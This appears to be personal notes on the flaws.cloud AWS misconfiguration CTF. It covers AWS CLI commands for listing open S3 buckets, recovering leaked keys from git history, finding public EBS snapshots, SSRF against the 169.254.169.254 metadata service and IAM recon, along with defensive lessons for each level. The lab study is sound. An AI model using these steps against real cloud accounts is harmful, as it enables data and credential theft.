 listed the objects in the bucket
 `aws s3api list-objects-v2 --bucket thebigiamchallenge-storage-9979f4b `

 aws s3 cp s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt - 


# Flaws.cloud Basic AWS s3 Misconfigurations CTF
### check if the site is gosted atatically on s3 bucket
```dig +nocmd flaws.cloud any +multiline +noall +answer ```

#### since the ip returned will be aws ip, hence it is an s3 bucket
another way to test will be to search http://<domainname>.s3.amazonaws.com/

## Level 1 - listing allowed on s3 Everyone
List bucket contents
``` aws s3 ls  s3://flaws.cloud/ --no-sign-request --region us-west-2 ```
  or if you are already authenticated then:
``` aws s3 ls  s3://flaws.cloud/ ```

 ## Level 2 - listing allowed on s3 Authenticated Users Only (IAM)
``` aws s3  ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud (need an account)```

## Level 3  S3 buckets git AWS secrets leakage
```aws s3 ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/```
```aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ .```
```git log```
```git checkout f7cebc46b471ca9838a0bdd1074bb498a3f84c87```
```git diff f52ec03b227ea6094b04e43f475fb0126edb5a61 b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526```
 
```aws configure --profile flaws```
```aws --profile flaws s3 ls```

People often leak AWS keys and then try to cover up their mistakes without revoking the keys. You should always revoke any AWS keys (or any secrets) that could have been leaked or were misplaced. Roll your secrets early and often.

# Level 4 : EBS Snapshot Snarfing
Finding Snapshot
AWS allows you to make snapshots of EC2's and databases (RDS). The main purpose for that is to make backups, but people sometimes use snapshots to get access back to their own EC2's when they forget the passwords. This also allows attackers to get access to things. Snapshots are normally restricted to your own account, so a possible attack would be an attacker getting access to an AWS key that allows them to start/stop and do other things with EC2's and then uses that to snapshot an EC2 and spin up an EC2 with that volume in your environment to get access to it. Like all backups, you need to be cautious about protecting them.

# Mounting a snapshot
http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud/hint2.html

```aws --profile flaws  ec2 describe-snapshots --owner-id 975426262029```


# Level 5 Instance Profile Metadata Attack
On cloud services, including AWS, the IP 169.254.169.254 is magical. It's the metadata service.
There is an RFC on it (RFC-3927), but you should read the AWS specific docs on it https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html.

The IP address 169.254.169.254 is a magic IP in the cloud world. AWS, Azure, Google, DigitalOcean and others use this to allow cloud resources to find out metadata about themselves. Some, such as Google, have additional constraints on the requests, such as requiring it to use `Metadata-Flavor: Google` as an HTTP header and refusing requests with an `X-Forwarded-For` header. AWS has recently created a new IMDSv2 that requires special headers, a challenge and response, and other protections, but many AWS accounts may not have enforced it. If you can make any sort of HTTP request from an EC2 to that IP, you'll likely get back information the owner would prefer you not see.
Examples of this problem
Nicolas GrÃ©goire discovered that prezi allowed you point their servers at a URL to include as content in a slide, and this allowed you to point to 169.254.169.254 which provided the access key for the EC2 intance profile (link). He also found issues with access to that magic IP with Phabricator and Coinbase.
A similar problem to getting access to the IAM profile's access keys is access to the EC2's user-data, which people sometimes use to pass secrets to the EC2 such as API keys or credentials.
Avoiding this mistake
Ensure your applications do not allow access to 169.254.169.254 or any local and private IP ranges. Additionally, ensure that IAM roles are restricted as much as possible.
    
# Level 6  Read-Only Recon of API Gateway and Lambda 
```aws --profile level6 iam get-user```
```aws --profile level6 iam list-attached-user-policies --user-name Level6```
```aws --profile level6 iam get-policy  --policy-arn arn:aws:iam::975426262029:policy/list_apigateways```
```aws --profile level6 iam get-policy-version  --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --version-id v4```
```aws --region us-west-2 --profile level6 lambda list-functions```
```aws --region us-west-2 --profile level6 lambda get-policy --function-name Level6```
```aws --profile level6 --region us-west-2 apigateway get-stages --rest-api-id "s33ppypa75"```
## Lesson learned
It is common to give people and entities read-only permissions such as the SecurityAudit policy. The ability to read your own and other's IAM policies can really help an attacker figure out what exists in your environment and look for weaknesses and mistakes.
Avoiding this mistake
Don't hand out any permissions liberally, even permissions that only let you read meta-data or know what your permissions are.


## Find S3 buckets for an organization
https://github.com/nahamsec/lazys3

## Gui brower for cloud storage
its a libre server
https://cyberduck.io/?l=en

## AWS Bounties report Hackerone
https://hackerone.com/reports/163476 - Information Disclosure Robotlegal
https://hackerone.com/reports/57505 - Shopify


 # Flaws
 1. opening list  permissions to "Everyone"
 2. open list permissions to "Any Authenticated AWS User"
